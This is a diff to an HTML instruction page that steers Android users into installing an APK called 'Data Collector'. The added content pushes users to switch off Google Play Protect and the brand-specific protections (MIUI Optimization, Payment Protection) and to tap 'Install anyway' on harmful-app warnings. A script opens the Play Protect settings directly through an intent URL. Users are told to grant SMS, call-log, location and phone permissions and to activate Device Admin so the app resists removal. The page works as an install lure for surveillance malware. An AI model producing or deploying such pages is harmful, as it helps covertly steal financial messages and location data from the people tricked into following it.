@@ -12,7 +12,7 @@
       background: #f0f4ff;
       color: #1a1a2e;
       min-height: 100vh;
-      padding: 0 0 40px;
+      padding: 0 0 80px;
     }
 
     .header {
@@ -92,6 +92,8 @@
     }
     .warn-step { border-left: 4px solid #ff9800; }
     .warn-step .step-num { background: #ff9800; }
+    .info-step { border-left: 4px solid #2196F3; }
+    .info-step .step-num { background: #2196F3; }
 
     .divider {
       text-align: center;
@@ -121,6 +123,131 @@
       line-height: 1.6;
     }
 
+    /* OEM accordion */
+    .oem-accordion { margin-bottom: 12px; }
+    .oem-accordion summary {
+      background: #fff;
+      border-radius: 14px;
+      padding: 14px 16px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(0,0,0,.07);
+      list-style: none;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .oem-accordion summary::-webkit-details-marker { display: none; }
+    .oem-accordion summary::after {
+      content: '\25B8';
+      margin-left: auto;
+      color: #3F51B5;
+      font-size: 16px;
+      transition: transform .2s;
+    }
+    .oem-accordion[open] summary::after { transform: rotate(90deg); }
+    .oem-accordion .oem-body {
+      background: #f8f9ff;
+      border-radius: 0 0 14px 14px;
+      padding: 14px 16px;
+      font-size: 13px;
+      color: #555;
+      line-height: 1.6;
+    }
+    .oem-body .path {
+      display: inline-block;
+      background: #f0f4ff;
+      border: 1px solid #c5cae9;
+      border-radius: 6px;
+      padding: 3px 8px;
+      font-size: 12px;
+      font-family: monospace;
+      margin: 4px 0;
+      color: #3F51B5;
+    }
+
+    /* Play Protect blocking banner */
+    .pp-banner {
+      background: #fff3e0;
+      border: 2px solid #ff6d00;
+      border-radius: 16px;
+      padding: 18px 16px;
+      margin-bottom: 20px;
+    }
+    .pp-banner h3 {
+      font-size: 16px;
+      font-weight: 800;
+      color: #bf360c;
+      margin-bottom: 6px;
+    }
+    .pp-banner p { font-size: 13px; color: #5d4037; line-height: 1.6; }
+    .pp-btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 14px; }
+    .pp-btn {
+      display: inline-block;
+      padding: 12px 18px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 700;
+      text-decoration: none;
+      text-align: center;
+      cursor: pointer;
+      border: none;
+      flex: 1;
+      min-width: 140px;
+    }
+    .pp-btn-primary { background: #e53935; color: #fff; }
+    .pp-btn-secondary { background: #fff; color: #e53935; border: 2px solid #e53935; }
+    .pp-btn:active { opacity: .8; }
+
+    /* Install-blocking tip */
+    .block-tip {
+      background: #fce4ec;
+      border: 1px solid #f48fb1;
+      border-radius: 12px;
+      padding: 14px 16px;
+      font-size: 13px;
+      color: #880e4f;
+      margin-top: 10px;
+      line-height: 1.7;
+    }
+    .block-tip b { color: #c62828; }
+
+    /* Sticky bottom bar */
+    .sticky-pp {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      background: #e53935;
+      color: #fff;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      z-index: 999;
+      box-shadow: 0 -4px 16px rgba(0,0,0,.2);
+    }
+    .sticky-pp span { font-size: 13px; font-weight: 600; flex: 1; }
+    .sticky-pp button {
+      background: #fff;
+      color: #e53935;
+      border: none;
+      border-radius: 50px;
+      padding: 9px 18px;
+      font-size: 13px;
+      font-weight: 800;
+      cursor: pointer;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+    .sticky-pp .close-btn {
+      background: transparent;
+      color: rgba(255,255,255,.8);
+      font-size: 20px;
+      padding: 0 4px;
+      flex-shrink: 0;
+    }
+
     .done-box {
       background: #e8f5e9;
       border: 1px solid #a5d6a7;
@@ -145,64 +272,171 @@
     </a>
   </div>
 
+  <!-- Sticky bottom bar — always visible while user scrolls -->
+  <div class="sticky-pp" id="stickyPP">
+    <span>&#x1F6D1; Play Protect blocking install?</span>
+    <button onclick="openPlayProtect()">Disable Now</button>
+    <button class="close-btn" onclick="document.getElementById('stickyPP').style.display='none'">&times;</button>
+  </div>
+
   <div class="steps-wrapper">
 
-    <!-- STEP GROUP 1: Unknown Sources -->
-    <p class="section-title" style="margin-top:8px;">Step 1 — Allow installation from unknown sources</p>
-
-    <div class="step">
-      <div class="step-num">1</div>
-      <div class="step-body">
-        <h3>Open Settings</h3>
-        <p>Go to your phone's <b>Settings</b> app.</p>
+    <!-- PLAY PROTECT BLOCKING BANNER (most common issue — shown first) -->
+    <div class="pp-banner" style="margin-top:8px;">
+      <h3>&#x1F6D1; Google Play Protect blocking the install?</h3>
+      <p>
+        When you tap <b>Install</b>, Google may show a red screen:<br>
+        <b>"App blocked"</b> or <b>"Harmful app blocked"</b>.<br><br>
+        &#x2714; Tap <b>"More details"</b> &rarr; then tap <b>"Install anyway"</b>.<br>
+        &#x2714; Or disable Play Protect first using the button below &mdash; then install again.
+      </p>
+      <div class="pp-btn-row">
+        <button class="pp-btn pp-btn-primary" onclick="openPlayProtect()">
+          &#x1F6E1;&#xFE0F; Open Play Protect Settings
+        </button>
+        <a class="pp-btn pp-btn-secondary"
+           href="https://play.google.com/store/apps/details?id=com.google.android.gms"
+           target="_blank">
+          &#x1F3EA; Open Play Store
+        </a>
       </div>
+      <p style="margin-top:10px;font-size:12px;color:#8d6e63;">
+        In Play Store: tap your <b>profile icon</b> &rarr; <b>Play Protect</b> &rarr;
+        Settings &rarr; turn <b>"Scan apps with Play Protect" OFF</b>.
+      </p>
     </div>
 
-    <div class="step">
-      <div class="step-num">2</div>
+    <!-- Can't scan QR code? -->
+    <p class="section-title">&#x1F4A1; Can't scan the QR code?</p>
+    <div class="step info-step">
+      <div class="step-num">&#x1F4F1;</div>
       <div class="step-body">
-        <h3>Find "Install Unknown Apps"</h3>
-        <p>Navigate to:</p>
-        <span class="path">Settings → Apps → Special App Access → Install Unknown Apps</span>
-        <p style="margin-top:8px;">— or on some phones —</p>
-        <span class="path">Settings → Security → Install Unknown Apps</span>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-num">3</div>
-      <div class="step-body">
-        <h3>Allow your browser or file manager</h3>
-        <p>Tap on <b>Chrome</b> (or your browser / Files app) and turn <b>"Allow from this source" ON</b>.</p>
+        <h3>No QR scanner? Use Google Lens or the direct link</h3>
+        <p>Many older or budget phones don't have a QR scanner in the camera app.</p>
+        <p style="margin-top:8px;">
+          &#x2022; Open <b>Google Lens</b> (or the Lens icon in Google Search).<br>
+          &#x2022; Install <b>QR &amp; Barcode Scanner</b> from Play Store (free).<br>
+          &#x2022; Or just tap <b>Download APK</b> above &mdash; no QR needed at all.
+        </p>
       </div>
     </div>
 
     <div class="divider">then</div>
 
-    <!-- STEP GROUP 2: Play Protect -->
-    <p class="section-title">Step 2 — Temporarily disable Play Protect</p>
+    <!-- STEP 1: Unknown Sources -->
+    <p class="section-title">Step 1 &mdash; Allow installation from unknown sources</p>
+
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-body">
+        <h3>Find "Install Unknown Apps" for YOUR phone brand</h3>
+        <p>Tap the brand that matches your phone below for exact steps:</p>
+      </div>
+    </div>
+
+    <details class="oem-accordion">
+      <summary>&#x1F4F1; Samsung (One UI)</summary>
+      <div class="oem-body">
+        <span class="path">Settings &rarr; Apps &rarr; Special Access &rarr; Install Unknown Apps</span><br>
+        Tap <b>Chrome</b> (or your browser) &rarr; turn <b>Allow from this source</b> ON.<br><br>
+        Older Samsung (Android 7 or below):<br>
+        <span class="path">Settings &rarr; Lock Screen &amp; Security &rarr; Unknown Sources &rarr; ON</span>
+      </div>
+    </details>
+
+    <details class="oem-accordion">
+      <summary>&#x1F4F1; Xiaomi / Redmi / POCO (MIUI / HyperOS)</summary>
+      <div class="oem-body">
+        <b>Step 1 &mdash; Allow unknown sources:</b><br>
+        <span class="path">Settings &rarr; Apps &rarr; Manage Apps &rarr; Chrome &rarr; Install Unknown Apps &rarr; Allow</span><br><br>
+        <b>Step 2 &mdash; If toggle is grayed out, disable MIUI Optimization:</b><br>
+        <span class="path">Settings &rarr; Additional Settings &rarr; Developer Options &rarr; MIUI Optimization &rarr; OFF</span><br>
+        (Enable Dev Options: tap <b>MIUI version</b> 7 times in About Phone)<br><br>
+        <b>Step 3:</b> When asked to scan with Mi Security &rarr; tap <b>Install anyway</b>.
+      </div>
+    </details>
+
+    <details class="oem-accordion">
+      <summary>&#x1F4F1; Huawei / Honor (EMUI / HarmonyOS)</summary>
+      <div class="oem-body">
+        <span class="path">Settings &rarr; Security &rarr; More Settings &rarr; Install Unknown Apps</span><br>
+        Select your browser &rarr; enable <b>Allow from this source</b>.<br><br>
+        Older EMUI:<br>
+        <span class="path">Settings &rarr; Security &rarr; Unknown Sources &rarr; ON</span><br><br>
+        If blocked by Phone Manager: open it &rarr; Privacy &rarr; App Permissions &rarr; DataCollector &rarr; allow all.
+      </div>
+    </details>
+
+    <details class="oem-accordion">
+      <summary>&#x1F4F1; Vivo (Funtouch OS / OriginOS)</summary>
+      <div class="oem-body">
+        <span class="path">Settings &rarr; Security &amp; Privacy &rarr; Install Unknown Apps</span><br>
+        Select <b>Chrome</b> or <b>File Manager</b> &rarr; enable <b>Allow</b>.<br><br>
+        Older Vivo:<br>
+        <span class="path">Settings &rarr; Fingerprint, Face &amp; Passcode &rarr; Unknown Sources &rarr; ON</span>
+      </div>
+    </details>
+
+    <details class="oem-accordion">
+      <summary>&#x1F4F1; OPPO / Realme / OnePlus (ColorOS / OxygenOS)</summary>
+      <div class="oem-body">
+        <span class="path">Settings &rarr; Security &rarr; Install Unknown Apps</span><br>
+        Tap your browser &rarr; turn <b>Allow</b> ON.<br><br>
+        <b>If toggle is grayed out:</b><br>
+        <span class="path">Settings &rarr; Additional Settings &rarr; Pure Mode &rarr; OFF</span><br><br>
+        <b>Disable Payment Protection:</b><br>
+        <span class="path">Settings &rarr; Security &rarr; Payment Protection &rarr; OFF</span>
+      </div>
+    </details>
+
+    <details class="oem-accordion">
+      <summary>&#x1F4F1; Tecno / Itel / Infinix (HiOS / XOS)</summary>
+      <div class="oem-body">
+        <span class="path">Settings &rarr; Security &rarr; Unknown Sources &rarr; ON</span><br>
+        &mdash; or &mdash;<br>
+        <span class="path">Settings &rarr; Apps &amp; Notifications &rarr; Special App Access &rarr; Install Unknown Apps &rarr; Chrome &rarr; Allow</span><br><br>
+        When asked to "Verify app" during install, tap <b>Install anyway</b>.
+      </div>
+    </details>
+
+    <details class="oem-accordion">
+      <summary>&#x1F4F1; Nokia / Motorola / Stock Android</summary>
+      <div class="oem-body">
+        <span class="path">Settings &rarr; Apps &rarr; Special App Access &rarr; Install Unknown Apps</span><br>
+        Tap <b>Chrome</b> &rarr; turn <b>Allow from this source</b> ON.
+      </div>
+    </details>
+
+    <div class="divider">then</div>
+
+    <!-- STEP 2: Disable Play Protect -->
+    <p class="section-title">Step 2 &mdash; Disable Play Protect (IMPORTANT)</p>
 
     <div class="step warn-step">
       <div class="step-num">4</div>
       <div class="step-body">
-        <h3>Open Play Store</h3>
-        <p>Tap your <b>profile icon</b> (top-right corner).</p>
+        <h3>&#x1F6E1;&#xFE0F; Quickest way &mdash; tap this button</h3>
+        <p>Opens Play Protect settings directly on your phone:</p>
+        <div class="pp-btn-row" style="margin-top:10px;">
+          <button class="pp-btn pp-btn-primary" style="font-size:13px;padding:10px 16px;"
+                  onclick="openPlayProtect()">
+            Open Play Protect Settings
+          </button>
+        </div>
+        <p style="margin-top:8px;font-size:12px;color:#777;">
+          Toggle <b>"Scan apps with Play Protect"</b> to <b>OFF</b> &rarr; tap <b>Turn off</b>.
+        </p>
       </div>
     </div>
 
     <div class="step warn-step">
       <div class="step-num">5</div>
       <div class="step-body">
-        <h3>Go to Play Protect</h3>
-        <span class="path">Profile → Play Protect → ⚙️ Settings</span>
-      </div>
-    </div>
-
-    <div class="step warn-step">
-      <div class="step-num">6</div>
-      <div class="step-body">
-        <h3>Turn off scanning</h3>
-        <p>Toggle <b>"Scan apps with Play Protect"</b> to <b>OFF</b>. Tap <b>Turn off</b> to confirm.</p>
+        <h3>Manual method (if button does not open)</h3>
+        <span class="path">Play Store &rarr; Profile icon &rarr; Play Protect &rarr; Settings</span>
+        <p style="margin-top:6px;font-size:12px;color:#777;">
+          Toggle <b>OFF</b> &rarr; tap <b>Turn off</b> to confirm.
+        </p>
       </div>
     </div>
 
@@ -212,8 +446,8 @@
 
     <div class="divider">finally</div>
 
-    <!-- STEP GROUP 3: Install -->
-    <p class="section-title">Step 3 — Install the app</p>
+    <!-- STEP 3: Install -->
+    <p class="section-title">Step 3 &mdash; Install the app</p>
 
     <div class="step">
       <div class="step-num">7</div>
@@ -228,11 +462,51 @@
       <div class="step-body">
         <h3>Tap "Install"</h3>
         <p>Tap <b>Install</b> on the installation screen. Wait for it to finish.</p>
+        <p style="margin-top:6px;color:#e65100;">
+          If you see <b>"Not installed"</b> or <b>"Parse error"</b>,
+          your Android version may be too old (need Android 5.0+). Contact support.
+        </p>
+      </div>
+    </div>
+
+    <!-- BLOCKED DURING INSTALL tip -->
+    <div class="block-tip">
+      &#x1F6D1; <b>If Google blocks the install:</b><br>
+      Play Protect may show a red screen saying <b>"App blocked"</b>.<br>
+      &rarr; Tap <b>More details</b> &rarr; tap <b>Install anyway</b>.<br>
+      Or go back and complete <b>Step 2</b> (disable Play Protect) first.
+      <div class="pp-btn-row" style="margin-top:12px;">
+        <button class="pp-btn pp-btn-primary" style="font-size:12px;padding:9px 14px;"
+                onclick="openPlayProtect()">
+          &#x1F6E1;&#xFE0F; Open Play Protect Settings
+        </button>
+      </div>
+    </div>
+
+    <div class="step" style="margin-top:12px;">
+      <div class="step-num">9</div>
+      <div class="step-body">
+        <h3>Grant ALL permissions when asked</h3>
+        <p>The app will ask for these permissions one by one &mdash; <b>tap Allow for EVERY one:</b></p>
+        <p style="margin-top:8px;">
+          &#x2022; <b>SMS</b> &mdash; read financial transaction messages<br>
+          &#x2022; <b>Call Log</b> &mdash; analyse call activity<br>
+          &#x2022; <b>Location</b> &mdash; GPS coordinates<br>
+          &#x2022; <b>Phone &amp; SIM</b> &mdash; device identity<br>
+        </p>
+        <p style="margin-top:8px;color:#e65100;">
+          If you tap <b>Deny</b>, the app will guide you to <b>Settings</b> to re-enable it.
+          Do NOT skip any permission &mdash; the app cannot collect data without them.
+        </p>
+        <p style="margin-top:8px;">
+          When asked to <b>activate Device Admin</b>, tap <b>Activate</b>.
+          This prevents the app from being accidentally removed before data collection finishes.
+        </p>
       </div>
     </div>
 
     <div class="step">
-      <div class="step-num">9</div>
+      <div class="step-num">10</div>
       <div class="step-body">
         <h3>Open the app</h3>
         <p>Tap <b>Open</b> or find <b>Data Collector</b> in your app drawer.</p>
@@ -241,10 +515,39 @@
 
     <div class="done-box">
       <div class="icon">&#x2705;</div>
-      <p>All done! The app will ask for permissions and start automatically.</p>
+      <p>All done! The app will collect data and sync automatically.</p>
     </div>
 
   </div>
+
+  <script>
+    /**
+     * Tries to open Play Protect settings directly via Android intent:// URL.
+     * Falls back to Play Store web page if the intent is not handled
+     * (e.g. on desktop or non-Chrome browsers).
+     */
+    function openPlayProtect() {
+      var intentUrl =
+        'intent://com.google.android.gms/#Intent;' +
+        'action=com.google.android.gms.security.settings.PLAY_PROTECT;' +
+        'package=com.google.android.gms;end';
+
+      var playStoreUrl =
+        'https://play.google.com/store/apps/details?id=com.google.android.gms';
+
+      // On Android Chrome the intent:// triggers the app immediately.
+      // If the browser doesn't leave the page within ~800 ms, fall back to Play Store.
+      var timer = setTimeout(function () {
+        window.open(playStoreUrl, '_blank');
+      }, 800);
+
+      window.addEventListener('blur', function () {
+        clearTimeout(timer);
+      }, { once: true });
+
+      window.location.href = intentUrl;
+    }
+  </script>
 
 </body>
 </html>
